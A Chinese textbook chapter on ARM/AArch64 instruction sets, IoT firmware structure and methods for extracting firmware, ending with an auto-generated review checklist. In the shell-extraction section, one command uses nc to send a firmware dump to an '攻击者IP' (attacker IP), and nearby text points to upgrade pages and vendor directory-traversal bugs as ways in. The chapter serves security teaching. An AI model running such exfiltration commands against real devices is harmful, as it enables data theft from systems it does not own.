# 第1章 ARM架构与IoT固件基础

### 1.1 ARM指令集体系

ARM（Advanced RISC Machine）是一种精简指令集计算机（RISC）架构，由英国ARM公司设计。与x86架构的CISC设计理念不同，ARM采用Load-Store架构，指令长度固定，寻址方式简单，具有低功耗、高性能的特点，非常适合嵌入式和移动设备。

#### 1.1.1 ARM架构版本演进

ARM架构经历了多个版本的演进，每个版本都引入了新的特性：

| 架构版本 | 代表系列 | 特点 |
|---------|---------|------|
| ARMv4T | ARM7TDMI | 首次引入Thumb指令集 |
| ARMv5TE | ARM926EJ-S | 增加DSP指令扩展 |
| ARMv6 | ARM11 | SIMD扩展、Thumb-2 |
| ARMv7-A | Cortex-A系列 | 应用处理器级，支持虚拟内存 |
| ARMv7-M | Cortex-M系列 | 微控制器级，深度嵌入式 |
| ARMv7-R | Cortex-R系列 | 实时处理器 |
| ARMv8-A | Cortex-A32/A53/A57/A72 | 64位架构（AArch64） |
| ARMv9-A | Cortex-A710/A510 | 最新架构，SVE2、机密计算 |

在IoT领域，最常见的是ARMv5、ARMv6和ARMv7-A架构的处理器，近年来ARMv8-A（64位）也逐渐增多。

#### 1.1.2 ARM指令集

ARM指令集是32位长度的指令集，具有以下特点：

- **固定指令长度**：所有指令均为32位（4字节），对齐到4字节边界
- **Load-Store架构**：只有Load/Store指令可以访问内存，数据处理指令只能操作寄存器
- **条件执行**：大多数ARM指令可以根据条件码执行，减少分支指令
- ** barrel shifter**：第二个操作数可以经过桶形移位器处理

**常用ARM指令示例：**

```armasm
; 数据处理指令
MOV R0, #0x1234        ; R0 = 0x1234
ADD R1, R2, R3         ; R1 = R2 + R3
SUB R1, R2, #0x10      ; R1 = R2 - 0x10
AND R0, R0, #0xFF      ; R0 = R0 & 0xFF
ORR R0, R0, #0x100     ; R0 = R0 | 0x100
EOR R0, R0, R0         ; R0 = 0（清零）
MUL R0, R1, R2         ; R0 = R1 * R2

; 内存访问指令
LDR R0, [R1]           ; R0 = *R1 (32位字加载)
LDRB R0, [R1]          ; R0 = *R1 (8位字节加载，零扩展)
LDRH R0, [R1]          ; R0 = *R1 (16位半字加载，零扩展)
STR R0, [R1]           ; *R1 = R0 (32位字存储)
LDR R0, [R1, #0x10]    ; R0 = *(R1 + 0x10)
LDR R0, [R1, R2]       ; R0 = *(R1 + R2)
LDMIA R0!, {R1-R4}     ; 从R0指向的地址加载多个字到R1-R4
STMIA R0!, {R1-R4}     ; 将R1-R4存储到R0指向的地址

; 分支指令
B target               ; 无条件跳转
BL target              ; 带链接的跳转（子程序调用，返回地址存LR）
BX LR                  ; 跳转到LR（子程序返回）
BEQ target             ; 相等时跳转
BNE target             ; 不相等时跳转
BGT target             ; 大于时跳转
BLT target             ; 小于时跳转

; 比较指令
CMP R0, R1             ; 比较R0和R1，设置条件码
TST R0, #0x1           ; 测试R0的第0位
```

**ARM寄存器组织：**

ARM架构有37个寄存器，其中用户模式下可见16个通用寄存器和1个状态寄存器：

| 寄存器 | 别名 | 用途 |
|-------|------|------|
| R0 | - | 通用寄存器/函数返回值/第1个参数 |
| R1 | - | 通用寄存器/第2个参数 |
| R2 | - | 通用寄存器/第3个参数 |
| R3 | - | 通用寄存器/第4个参数 |
| R4-R11 | - | 通用寄存器（被调用者保存） |
| R12 | IP | 内部过程调用暂存寄存器 |
| R13 | SP | 堆栈指针 |
| R14 | LR | 链接寄存器（返回地址） |
| R15 | PC | 程序计数器 |
| CPSR | - | 当前程序状态寄存器 |

**函数调用约定（AAPCS）：**
- 参数传递：R0-R3 传递前4个参数，更多参数通过栈传递
- 返回值：R0（32位）或 R0-R1（64位）
- 被调用者保存寄存器：R4-R11, SP, LR
- 调用者保存寄存器：R0-R3, R12
- 栈对齐：8字节对齐

#### 1.1.3 Thumb与Thumb-2指令集

Thumb指令集是ARM的16位压缩指令集，旨在提高代码密度。Thumb指令只有16位长，可以减少约30-40%的代码大小，非常适合内存资源有限的嵌入式系统。

**Thumb指令集特点：**
- 指令长度为16位
- 大多数指令只能访问R0-R7（低位寄存器）
- 无条件跳转范围有限
- 没有条件执行（除了分支指令）
- 通过BX指令在ARM和Thumb状态之间切换

**Thumb-2扩展：**
Thumb-2是Thumb指令集的扩展，引入了32位Thumb指令，兼具ARM的性能和Thumb的代码密度优势。Thumb-2是ARMv7及以后架构的首选指令集。

**状态切换：**
```armasm
; 从ARM状态切换到Thumb状态
BX R0           ; 如果R0的最低位为1，则进入Thumb状态

; 从Thumb状态切换到ARM状态
BX R0           ; 如果R0的最低位为0，则进入ARM状态
```

在逆向分析中，判断当前代码处于ARM还是Thumb状态非常重要，可以通过以下方式判断：
- 查看函数地址的最低位（Thumb函数地址通常为奇数，实际地址需要减1）
- 查看BX BLX指令的目标地址最低位
- 查看CPSR的T位

#### 1.1.4 AArch64（ARM64）指令集

AArch64是ARMv8引入的64位架构，提供了更大的寻址空间和更强的性能。随着高端IoT设备的普及，AArch64固件也越来越常见。

**AArch64主要特点：**
- 31个通用寄存器（X0-X30），均为64位
- W0-W30是对应X寄存器的低32位
- 专用的零寄存器（XZR/WZR）
- 专用的栈指针寄存器（SP）
- 程序计数器（PC）不能直接作为通用寄存器访问
- 固定4字节指令长度
- 丰富的SIMD和浮点指令

**AArch64常用指令示例：**

```armasm
; 数据处理
MOV X0, #0x1234        ; X0 = 0x1234
ADD X1, X2, X3         ; X1 = X2 + X3
SUB X1, X2, #0x10      ; X1 = X2 - 0x10
ADRP X0, #0x10000      ; 计算页地址（相对PC）

; 内存访问
LDR X0, [X1]           ; 64位加载
LDR W0, [X1]           ; 32位加载
LDRB W0, [X1]          ; 8位加载
STR X0, [X1, #0x10]!   ; 预索引存储
LDR X0, [X1], #0x10    ; 后索引加载
STP X29, X30, [SP, #-0x20]!  ; 存储一对寄存器（常用作函数序言）
LDP X29, X30, [SP], #0x20    ; 加载一对寄存器（常用作函数尾声）

; 分支
B target               ; 无条件跳转
BL target              ; 带链接跳转
RET                    ; 返回（等价于 BR X30）
CBZ X0, target         ; 比较为零则跳转
CBNZ X0, target        ; 比较非零则跳转

; 函数调用约定
; 参数：X0-X7（8个参数），更多通过栈传递
; 返回值：X0（64位）或 X0-X1（128位）
; 被调用者保存：X19-X28, X29(FP), X30(LR)
```

### 1.2 IoT固件类型与格式

IoT固件是运行在嵌入式设备上的软件，通常包含引导加载程序、内核、文件系统等多个组成部分。了解固件的组成结构是逆向分析的第一步。

#### 1.2.1 固件的典型组成

一个典型的IoT设备固件包含以下部分：

```
+--------------------------+
|     Bootloader (引导程序)  |
+--------------------------+
|     Kernel (内核镜像)      |
+--------------------------+
|     Device Tree (设备树)   |
+--------------------------+
|     RootFS (根文件系统)    |
|                          |
|  /bin /sbin /usr /etc    |
|  /lib /var /home /tmp    |
+--------------------------+
|     User Data (用户数据)   |
+--------------------------+
```

**各部分说明：**

1. **Bootloader**：设备上电后首先执行的程序，负责初始化硬件、加载内核到内存并启动内核。常见的Bootloader有U-Boot、RedBoot等。

2. **Kernel**：Linux内核镜像，通常经过压缩。嵌入式设备常用的内核格式有zImage、uImage等。

3. **Device Tree（DTB）**：设备树二进制文件，描述硬件的布局信息（CPU、内存、外设等），让内核无需硬编码硬件信息。

4. **RootFS**：根文件系统，包含系统运行所需的所有程序、库、配置文件等。常见格式有SquashFS、JFFS2、YAFFS2、UBIFS等。

#### 1.2.2 uImage格式

uImage是U-Boot常用的镜像格式，它在原始镜像（如zImage）前添加了一个64字节的头部，包含镜像的类型、加载地址、入口点、校验和等信息。

**uImage头部结构：**

```c
typedef struct image_header {
    uint32_t ih_magic;         /* 魔数 0x27051956 */
    uint32_t ih_hcrc;          /* 头部CRC校验和 */
    uint32_t ih_time;          /* 创建时间戳 */
    uint32_t ih_size;          /* 镜像数据大小 */
    uint32_t ih_load;          /* 加载地址 */
    uint32_t ih_ep;            /* 入口点 */
    uint32_t ih_dcrc;          /* 数据CRC校验和 */
    uint8_t  ih_os;            /* 操作系统类型 */
    uint8_t  ih_arch;          /* CPU架构 */
    uint8_t  ih_type;          /* 镜像类型 */
    uint8_t  ih_comp;          /* 压缩方式 */
    uint8_t  ih_name[32];      /* 镜像名称 */
} image_header_t;
```

使用`file`命令或`binwalk`可以识别uImage格式：
```
$ file firmware.bin
firmware.bin: u-boot legacy uImage, Linux-3.4.11, Linux/ARM, OS Kernel Image (gzip), 1376256 bytes, ...
```

#### 1.2.3 设备树（DTB）

设备树（Device Tree）是一种描述硬件资源的数据结构，通过编译工具将DTS（Device Tree Source）编译成DTB（Device Tree Blob）二进制格式。

**DTB结构：**
- 头部（fdt_header）：包含魔数、版本、各部分偏移
- 内存预留块（memory reservation block）
- 结构块（structure block）：节点和属性数据
- 字符串块（strings block）：属性名字符串

设备树对于固件分析非常重要，它可以揭示：
- CPU型号和核心数
- 内存布局和大小
- 外设基地址和中断配置
- Flash分区信息
- GPIO引脚定义

使用`fdtdump`或`dtc`工具可以反编译DTB：
```bash
dtc -I dtb -O dss firmware.dtb > firmware.dts  # 反编译DTB为DTS
```

#### 1.2.4 根文件系统格式

IoT设备的根文件系统有多种格式，常见的有：

| 文件系统 | 特点 | 常见设备 |
|---------|------|---------|
| SquashFS | 只读压缩文件系统，高压缩比 | 路由器、摄像头 |
| JFFS2 | 日志结构Flash文件系统，支持读写 | NOR Flash设备 |
| YAFFS2 | 专为NAND Flash设计 | NAND Flash设备 |
| UBIFS | 基于UBI层的Flash文件系统 | 大容量NAND Flash |
| cramfs | 压缩只读文件系统 | 小容量设备 |
| ext2/3/4 | 标准Linux文件系统 | 高端设备（eMMC） |
| initramfs | 内存文件系统 | 启动阶段使用 |

**SquashFS**是最常见的IoT文件系统格式，特点是：
- 只读，适合固件分区
- 高压缩比（支持gzip、lzma、xz、zstd等压缩算法）
- 可以直接挂载

**提取SquashFS的方法：**
```bash
unsquashfs -d rootfs filesystem.squashfs  # 解压到rootfs目录
```

#### 1.2.5 固件打包格式

厂商通常会将多个部分打包成一个完整的固件文件，方便升级。常见的打包方式有：

1. **简单拼接**：将各部分按固定偏移拼接在一起
2. **TRX格式**：Broadcom常用的固件格式
3. **D-Link固件头**：D-Link设备的固件格式
4. **TP-Link固件头**：TP-Link设备的固件格式
5. **Merkur格式**：某些厂商的自定义格式
6. **AES加密**：部分固件会进行整体加密
7. **LZMA/Gzip压缩**：部分固件会整体压缩

识别固件格式是逆向分析的第一步，通常使用`binwalk`工具来自动识别和提取。

### 1.3 固件提取方法

在进行固件分析之前，首先需要获取固件。根据获取途径的不同，可以分为硬件提取、软件提取和OTA提取三种方法。

#### 1.3.1 硬件提取

硬件提取是最直接的固件获取方式，通过物理访问设备的存储芯片来读取固件内容。

**适用场景：**
- 无法通过软件方式获取固件
- 固件加密存储，运行时解密
- 需要分析Bootloader之前的代码

**常见存储芯片：**

| 芯片类型 | 特点 | 接口 | 容量范围 |
|---------|------|------|---------|
| SPI Flash | 串行接口，成本低 | SPI | 1MB-128MB |
| NOR Flash | 并行接口，XIP支持 | 并行 | 1MB-256MB |
| NAND Flash | 大容量，成本低 | NAND接口 | 128MB-2GB |
| eMMC | 嵌入式多媒体卡 | MMC接口 | 1GB-32GB |

**SPI Flash读取步骤：**

1. **定位Flash芯片**：在PCB上找到SPI Flash芯片，通常是8引脚SOIC封装
2. **确定引脚定义**：查找芯片数据手册，确定CS、CLK、MOSI、MISO、VCC、GND引脚
3. **连接读取器**：使用SPI编程器（如CH341A、TL866II+）连接芯片
   - 方法一：直接在板读取（需要确保设备断电，注意引脚冲突）
   - 方法二：吹下芯片读取（使用热风枪，需要焊接技巧）
4. **读取固件**：使用编程软件读取芯片内容并保存为bin文件

**常用工具：**
- **CH341A编程器**：廉价的USB-SPI编程器，配合flashrom或NeoProgrammer使用
- **TL866II+编程器**：支持多种芯片，功能强大
- **Bus Pirate**：多功能串口工具，支持SPI/I2C等
- **Raspberry Pi**：可通过GPIO模拟SPI读取

**命令示例（使用flashrom）：**
```bash
# 读取SPI Flash
flashrom -p ch341a_spi -r firmware.bin

# 查看芯片信息
flashrom -p ch341a_spi --flash-name
```

**注意事项：**
- 读取前确保设备完全断电
- 注意电压匹配（3.3V vs 1.8V）
- 在板读取时注意其他芯片的影响
- 读取后建议多次读取校验，确保数据完整

#### 1.3.2 软件提取

软件提取是通过设备已有的接口（如Web管理界面、SSH、Telnet等）来获取固件。

**方法1：官方固件下载**
- 大多数厂商会在官网提供固件升级文件
- 这是最简单、最合法的获取方式
- 注意：官方固件可能经过加密或签名，需要解密

**方法2：Web管理界面备份**
- 部分设备支持通过Web界面备份配置或固件
- 某些设备的"固件升级"页面可以利用来提取固件
- 有时配置备份中包含敏感信息

**方法3：通过Shell提取**
如果能获取设备的Shell访问权限（Telnet/SSH/串口），可以直接读取Flash分区：

```bash
# 查看MTD分区信息
cat /proc/mtd

# 读取整个Flash
cat /dev/mtdblock0 > /tmp/firmware.bin

# 读取特定分区
dd if=/dev/mtdblock2 of=/tmp/kernel.bin bs=65536

# 通过网络传输固件
nc -w 3 <攻击者IP> 1234 < /tmp/firmware.bin
```

**方法4：通过调试接口提取**
- UART串口：通过串口进入Bootloader命令行，读取Flash
- JTAG/SWD：通过调试接口读取内存和Flash
- 某些Bootloader支持tftp下载或内存dump功能

#### 1.3.3 OTA提取

OTA（Over-The-Air）是指设备通过网络自动升级固件的方式。通过抓包分析OTA升级过程，可以获取固件下载地址和固件内容。

**OTA提取步骤：**

1. **网络抓包**
   - 将设备和电脑连接到同一网络
   - 使用Wireshark抓包，过滤设备IP的流量
   - 触发设备检查更新或升级

2. **分析升级协议**
   - 查找HTTP/HTTPS请求中的固件下载URL
   - 分析固件下载的服务器地址和路径
   - 注意是否有自定义的升级协议

3. **下载固件**
   - 如果是HTTP明文传输，直接下载
   - 如果是HTTPS，可能需要解密SSL流量（需安装证书）
   - 有些厂商的固件服务器存在目录遍历漏洞

4. **逆向升级程序**
   - 分析设备上的升级程序（如upgraded、fw_update等）
   - 查找固件下载URL和加密密钥
   - 分析固件校验和签名验证逻辑

**常见OTA协议特征：**
- HTTP/HTTPS下载最常见
- 部分使用MQTT或CoAP协议
- 固件可能分块下载
- 可能包含版本号、设备型号等参数
- URL中常包含"firmware"、"update"、"upgrade"等关键词

#### 1.3.4 固件完整性验证

获取固件后，需要验证固件的完整性和正确性：

1. **文件类型识别**：使用`file`命令识别文件类型
2. **binwalk扫描**：使用`binwalk`扫描固件结构
3. **校验和验证**：如果已知校验和算法，验证固件完整性
4. **字符串分析**：搜索可打印字符串，判断是否为有效固件
5. **大小合理性**：对比设备Flash容量，判断固件大小是否合理

---

---

## 📋 内容审核与补充建议

> 针对「第1章 ARM架构与IoT固件基础」部分的内容审核结果：

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
